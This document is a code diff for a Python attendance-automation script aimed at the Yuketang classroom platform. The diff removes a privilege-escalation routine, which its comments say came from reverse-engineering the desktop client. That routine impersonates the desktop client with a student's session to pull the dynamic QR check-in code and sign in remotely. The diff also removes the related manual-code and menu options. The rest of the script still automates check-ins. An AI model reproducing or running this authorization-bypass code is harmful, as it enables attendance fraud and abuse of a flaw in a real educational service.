@@ -624,114 +624,6 @@ class YuketangHelper:
         except Exception as e:
             log(f"[!] 签到请求异常: {e}")
 
-    def try_dynamic_checkin(self, lesson_id):
-        """越权攻击：尝试用学生 Cookie 获取动态二维码暗号并自动签到
-        
-        逆向桌面端 Electron 源码发现的攻击链路：
-        1. POST /api/v3/lesson/checkin {source:10} → 获取 lessonToken
-        2. GET /api/v3/lesson/fetch-dynamic-invitation?v=2 → 获取动态暗号
-        3. 用暗号完成签到
-        """
-        log("[*] 尝试越权获取动态签到暗号...")
-        self._refresh_session_fields()
-        
-        # 第一步：以桌面端身份(source=10)获取 lessonToken
-        try:
-            checkin_url = f"{BASE_URL}/api/v3/lesson/checkin"
-            payload = {"lessonId": str(lesson_id), "source": 10}
-            resp = self.session.post(checkin_url, json=payload).json()
-            
-            if resp.get('code') != 0 or not resp.get('data'):
-                log(f"[-] 获取 lessonToken 失败: {resp.get('msg', '未知错误')}")
-                return False
-            
-            lesson_token = resp['data'].get('lessonToken')
-            role = resp['data'].get('role', '未知')
-            log(f"[*] 获取到 lessonToken, 分配角色: {role}")
-            
-            if not lesson_token:
-                log("[-] lessonToken 为空，服务端可能未返回")
-                return False
-        except Exception as e:
-            log(f"[!] 获取 lessonToken 异常: {e}")
-            return False
-        
-        # 第二步：用 Bearer Token 拉取动态暗号
-        try:
-            headers = {
-                "Authorization": f"Bearer {lesson_token}",
-                "User-Agent": GLOBAL_UA,
-                "xtbz": "ykt",
-            }
-            inv_url = f"{BASE_URL}/api/v3/lesson/fetch-dynamic-invitation"
-            resp2 = self.session.get(inv_url, params={"v": 2}, headers=headers).json()
-            
-            if resp2.get('code') != 0 or not resp2.get('data'):
-                log(f"[-] 越权获取暗号失败: {resp2.get('msg', '服务端拒绝')}")
-                log("[*] 服务端可能校验了 role，学生 token 无权限")
-                return False
-            
-            qr_content = resp2['data'].get('qrContent', '')
-            if not qr_content:
-                log("[-] 返回的 qrContent 为空")
-                return False
-            
-            # 从 qrContent URL 中提取 ticket (5位数字暗号)
-            ticket_match = re.search(r'ticket=([A-Za-z0-9]+)', qr_content)
-            if not ticket_match:
-                log(f"[-] 无法从 qrContent 中提取 ticket: {qr_content}")
-                return False
-            
-            ticket = ticket_match.group(1)
-            log(f"[+] 越权成功！获取到动态暗号: {ticket}")
-            
-        except Exception as e:
-            log(f"[!] 获取动态暗号异常: {e}")
-            return False
-        
-        # 第三步：用暗号签到
-        return self.manual_ticket_checkin(lesson_id, ticket)
-
-    def manual_ticket_checkin(self, lesson_id, ticket):
-        """使用手动输入的 5 位暗号(ticket)完成动态二维码签到"""
-        log(f"[*] 正在使用暗号 [{ticket}] 签到...")
-        try:
-            self._refresh_session_fields()
-            # 尝试新接口 (source=14 表示扫码签到)
-            payload = {"lessonId": str(lesson_id), "source": 14, "inviteCode": str(ticket)}
-            headers = {"X-CSRFToken": self.csrftoken, "User-Agent": GLOBAL_UA, "xtbz": "ykt"}
-            
-            res = self.session.post(f"{BASE_URL}/api/v3/lesson/checkin", headers=headers, json=payload).json()
-            if res.get('code') == 0:
-                log(f"[+] 动态签到成功！(课堂: {lesson_id}, 暗号: {ticket})")
-                self._record_checkin(lesson_id)
-                self.save_session()
-                return True
-            
-            err_msg = res.get('msg', '')
-            log(f"[-] 新接口签到失败: {err_msg}")
-            
-            # 如果新接口返回 DYNAMIC_QR_CHECK_IN_REFUSED，说明暗号已过期
-            if 'DYNAMIC_QR' in err_msg.upper():
-                log("[!] 暗号已过期或此签到要求动态码")
-                return False
-            
-            # 回退尝试旧接口
-            old_payload = {"invite_code": str(ticket), "source": 14}
-            res2 = self.session.post(f"{BASE_URL}/api/lesson/web_check_in", headers=headers, json=old_payload).json()
-            if res2.get('code') == 0:
-                log(f"[+] 动态签到成功（旧接口）！(课堂: {lesson_id})")
-                self._record_checkin(lesson_id)
-                self.save_session()
-                return True
-            else:
-                log(f"[-] 旧接口也失败: {res2.get('msg', '未知错误')}")
-                return False
-                
-        except Exception as e:
-            log(f"[!] 暗号签到异常: {e}")
-            return False
-
     def keep_alive(self):
         try:
             self.session.get(f"{BASE_URL}/v2/web/index", timeout=10)
@@ -759,8 +651,6 @@ if __name__ == "__main__":
     parser.add_argument("-pw", "--password", type=str, help="密码（覆盖脚本内置配置）")
     parser.add_argument("--cooldown", type=int, default=CHECKIN_COOLDOWN_MINUTES, help=f"签到去重冷却时间，分钟（默认 {CHECKIN_COOLDOWN_MINUTES}）")
     parser.add_argument("-s", "--schedule", type=int, metavar="N", help="延迟 N 分钟后开始，每分钟自动检测并签到")
-    parser.add_argument("--ticket", type=str, metavar="CODE", help="手动输入 5 位暗号，完成动态二维码签到")
-    parser.add_argument("--dynamic", action="store_true", help="尝试越权获取动态暗号并自动签到")
     args = parser.parse_args()
 
     CHECKIN_COOLDOWN_MINUTES = args.cooldown
@@ -802,24 +692,6 @@ if __name__ == "__main__":
             log("[-] 当前没有正在进行的课堂")
         sys.exit(0)
 
-    # 手动暗号签到模式
-    if args.ticket:
-        l_id, c_id = helper.get_active_lesson_data()
-        if l_id:
-            helper.manual_ticket_checkin(l_id, args.ticket)
-        else:
-            log("[-] 当前没有正在进行的课堂")
-        sys.exit(0)
-
-    # 越权获取动态暗号模式
-    if args.dynamic:
-        l_id, c_id = helper.get_active_lesson_data()
-        if l_id:
-            helper.try_dynamic_checkin(l_id)
-        else:
-            log("[-] 当前没有正在进行的课堂")
-        sys.exit(0)
-
     # 定时签到模式
     if args.schedule is not None:
         delay = args.schedule
@@ -841,7 +713,7 @@ if __name__ == "__main__":
 
     # 交互模式
     while True:
-        print("\n1. 自动扫描签到\n2. 扫码登录\n3. 定时签到\n4. 动态二维码签到（测试）\n5. 手动输入暗号签到\n6. 退出")
+        print("\n1. 自动扫描签到\n2. 扫码登录\n3. 定时签到\n4. 退出")
         try:
             c = input("> ").strip()
         except (KeyboardInterrupt, EOFError):
@@ -876,21 +748,4 @@ if __name__ == "__main__":
             except KeyboardInterrupt:
                 log("[*] 已停止定时签到，返回菜单")
         elif c == "4":
-            l_id, c_id = helper.get_active_lesson_data()
-            if l_id:
-                helper.try_dynamic_checkin(l_id)
-            else:
-                log("[-] 当前没有正在进行的课堂")
-        elif c == "5":
-            l_id, c_id = helper.get_active_lesson_data()
-            if not l_id:
-                log("[-] 当前没有正在进行的课堂")
-                continue
-            try:
-                ticket = input("请输入 5 位暗号: ").strip()
-            except (KeyboardInterrupt, EOFError):
-                continue
-            if ticket:
-                helper.manual_ticket_checkin(l_id, ticket)
-        elif c == "6":
             sys.exit(0)
